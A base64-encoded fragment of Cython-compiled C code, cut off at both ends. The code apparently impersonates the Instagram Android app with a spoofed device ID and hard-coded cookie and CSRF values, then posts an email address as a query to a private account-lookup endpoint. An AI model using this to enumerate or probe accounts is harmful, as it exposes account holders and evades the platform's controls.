CZfX3B5eF90XzMpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOwogICAgIHsKCiAgICAgIAogICAgICBfX3B5eF90XzUgPSBOVUxMOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dnYik7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE4MywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX3B5eF90XzcgPSAxOwogICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzYpKSkgewogICAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7CiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNSk7CiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzYpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF82LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfNyA9IDA7CiAgICAgIH0KICAgICAgI2VuZGlmCiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBOVUxMfTsKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNywgKDEtX19weXhfdF83KSB8IChfX3B5eF90XzcqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE4MywgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIH0KICAgICAgX19weXhfdl91YSA9IF9fcHl4X3RfNDsKICAgICAgX19weXhfdF80ID0gMDsKCiAgICAgIAogICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hbmRyb2lkKTsKICAgICAgX19weXhfdl9kZXYgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FuZHJvaWQ7CgogICAgICAKICAgICAgX19weXhfdF84ID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oYXNobGliKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMTg2LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7CiAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X21kNSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAxODYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICBfX3B5eF90XzExID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXVpZCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAxODYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7CiAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91dWlkNCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMykpIF9fUFlYX0VSUigwLCAxODYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMyk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICAgIF9fcHl4X3RfNyA9IDE7CiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTMpKSkgewogICAgICAgIF9fcHl4X3RfMTEgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzEzKTsKICAgICAgICBhc3NlcnQoX19weXhfdF8xMSk7CiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzEzKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMSk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzEzLCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfNyA9IDA7CiAgICAgIH0KICAgICAgI2VuZGlmCiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMSwgTlVMTH07CiAgICAgICAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMywgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMS1fX3B5eF90XzcpIHwgKF9fcHl4X3RfNypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDE4NiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7CiAgICAgIH0KICAgICAgX19weXhfdF8xMyA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdF85KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEzKSkgX19QWVhfRVJSKDAsIDE4NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEzKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgIF9fcHl4X3RfOSA9IFB5VW5pY29kZV9Bc0VuY29kZWRTdHJpbmcoKChQeU9iamVjdCopX19weXhfdF8xMyksIE5VTEwsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCAxODYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDsKICAgICAgX19weXhfdF83ID0gMTsKICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8xMCkpKSB7CiAgICAgICAgX19weXhfdF84ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8xMCk7CiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfOCk7CiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzEwKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF84KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMTAsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19weXhfdF83ID0gMDsKICAgICAgfQogICAgICAjZW5kaWYKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzgsIF9fcHl4X3RfOX07CiAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMi1fX3B5eF90XzcpIHwgKF9fcHl4X3RfNypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxODYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICB9CiAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X3RfNTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7CiAgICAgIF9fcHl4X3RfNyA9IDA7CiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBOVUxMfTsKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGV4ZGlnZXN0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzcsICgxLV9fcHl4X3RfNykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTg2LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgfQogICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRTbGljZShfX3B5eF90XzQsIDAsIDE2LCBOVUxMLCBOVUxMLCAmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfc2xpY2VbMF0sIDAsIDEsIDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxODYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CgogICAgICAKICAgICAgX19weXhfdF80ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3ZfZGV2LCBfX3B5eF90XzUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxODUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fcHl4X3ZfZGV2aWNlX2lkID0gX19weXhfdF80OwogICAgICBfX3B5eF90XzQgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNSA9IE5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXVpZCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE4NywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91dWlkNCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAxODcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBfX3B5eF90XzcgPSAxOwogICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzEwKSkpIHsKICAgICAgICBfX3B5eF90XzUgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzEwKTsKICAgICAgICBhc3NlcnQoX19weXhfdF81KTsKICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMTApOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8xMCwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX3B5eF90XzcgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgTlVMTH07CiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMS1fX3B5eF90XzcpIHwgKF9fcHl4X3RfNypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxODcsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICB9CiAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAxODcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICBfX3B5eF92X3V1aSA9ICgoUHlPYmplY3QqKV9fcHl4X3RfMTApOwogICAgICBfX3B5eF90XzEwID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTg5LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9Vc2VyX0FnZW50LCBfX3B5eF92X3VhKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4OSwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQ29va2llLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X21pZF9aVmZHdmdBQkFBR29RcWE3QVkzbWdvWUJWMW5QKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4OSwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0NvbnRlbnRfVHlwZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZV8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4OSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fcHl4X3ZfaGVhZGVycyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfMTApOwogICAgICBfX3B5eF90XzEwID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTk0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNSA9IE5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanNvbik7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE5NSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2R1bXBzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMTk1LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCg1KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTk2LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jc3JmdG9rZW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfOXkzTjVrTHF6aWFsUUE3ejk2QU1peUFLTE1CV3BxVmopIDwgKDApKSBfX1BZWF9FUlIoMCwgMTk2LCBfX3B5eF9MM19lcnJvcikKCiAgICAgIAogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWRpZCwgX19weXhfdl91dWkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTk2LCBfX3B5eF9MM19lcnJvcikKCiAgICAgIAogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ3VpZCwgX19weXhfdl91dWkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTk2LCBfX3B5eF9MM19lcnJvcikKCiAgICAgIAogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGV2aWNlX2lkLCBfX3B5eF92X2RldmljZV9pZCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxOTYsIF9fcHl4X0wzX2Vycm9yKQoKICAgICAgCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9xdWVyeSwgX19weXhfdl9lbWFpbCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxOTYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX3B5eF90XzcgPSAxOwogICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzkpKSkgewogICAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfOSk7CiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNSk7CiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzkpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF85LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfNyA9IDA7CiAgICAgIH0KICAgICAgI2VuZGlmCiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF90XzZ9OwogICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfOSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF83LCAoMi1fX3B5eF90XzcpIHwgKF9fcHl4X3RfNypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTk1LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgfQoKICAgICAgCiAgICAgIF9fcHl4X3RfOSA9IFB5TnVtYmVyX0FkZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzBkMDY3YzJmODZjYWMyYzE3ZDY1NTYzMWM5Y2VjMjQwLCBfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCAxOTQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2lnbmVkX2JvZHksIF9fcHl4X3RfOSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxOTQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pZ19zaWdfa2V5X3ZlcnNpb24sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfNCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxOTQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX3B5eF92X2RhdGEgPSAoKFB5T2JqZWN0KilfX3B5eF90XzEwKTsKICAgICAgX19weXhfdF8xMCA9IDA7CgogICAgICAKICAgICAgX19weXhfdF85ID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIwNCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Bvc3QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAyMDQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CgogICAgICAKICAgICAgX19weXhfdF83ID0gMTsKICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF82KSkpIHsKICAgICAgICBfX3B5eF90XzkgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzYpOwogICAgICAgIGFzc2VydChfX3B5eF90XzkpOwogICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF82KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF85KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNiwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX3B5eF90XzcgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDMgOiAwKV0gPSB7X19weXhfdF85LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX2lfaW5zdGFncmFtX2NvbV9hcGlfdjFfYWNjfTsKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKDMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMDQsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hlYWRlcnMsIF9fcHl4X3ZfaGVhZGVycywgX19weXhfdF80LCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIwNCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGF0YSwgX19weXhfdl9kYXRhLCBfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzKzIsIDEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjA0LCBfX3